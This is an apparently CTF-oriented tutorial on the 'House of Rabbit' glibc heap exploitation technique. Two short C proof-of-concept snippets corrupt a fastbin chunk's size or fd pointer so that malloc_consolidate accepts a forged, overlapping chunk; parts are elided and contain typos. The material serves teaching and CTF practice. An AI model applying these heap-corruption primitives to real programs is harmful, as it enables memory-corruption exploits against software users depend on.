# House of Rabbit

## Introduction
House of Rabbit is a technique for forging heap chunks, which was proposed as early as 2017 but has only appeared in CTF competitions in the past couple of months. We generally apply it in fastbin attacks, as other bins like unsorted bin have better exploitation methods.

## Principle
We know that fastbin manages freed heap chunks of the same size using a singly linked list. When allocating, it checks whether the size is reasonable; if not, the program will exit abnormally. House of Rabbit exploits the fact that when malloc consolidates fastbin chunks by merging them, the size is not checked. This allows us to forge a fake heap chunk, preparing for further exploitation.

Since the original author's [POC](https://github.com/shift-crops/House_of_Rabbit) requires many conditions, I'll introduce the essence of this attack directly.

`Prerequisites`:
1. Can modify the fd pointer or size of fastbin
2. Can trigger malloc consolidate (merge top or malloc big chunk, etc.)


Below is the POC
`POC 1`: modify the size of fastbin chunk
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x40); //0x602050
malloc(0x10);
free(chunk1);
free(chunk2);
/* Heap layout ... (keep all code as-is) */
chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1
malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate
/* ... (keep all code/comments as-is) */
```
`POC 2`:modify FD pointer
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x100);//0x602050

chunk2[1]=0x31; //fake chunk size 0x30
chunk2[7]=0x21  //fake chunk's next chunk
chunk2[11]=0x21 //fake chunk's next chunk's next chuck
/* ... (keep all code/comments as-is) */
free(chunk1);
chuck1[0]=0x602060;// modify the fd of chunk1
/* ... */
malloc(5000);// malloc a  big chunk to trigger malloc consolidate
/* ... */
```

The principle is simple: by modifying the size of a fastbin chunk (as shown in POC 1 above) to directly construct an overlapping chunk, or modifying the fd pointer (as shown in POC 2) to make it point to a fake chunk. After triggering malloc consolidate, this fake chunk becomes a legitimate chunk.

## Summary
The advantage of House of Rabbit is that it's easy to construct overlapping chunks. Since it can be based on fastbin attacks, you can even complete the attack without leaking information. You can deepen your understanding of this attack through practice with example challenges.

## Example Challenges
1. HITB-GSEC-XCTF 2018 mutepig
2. To be added
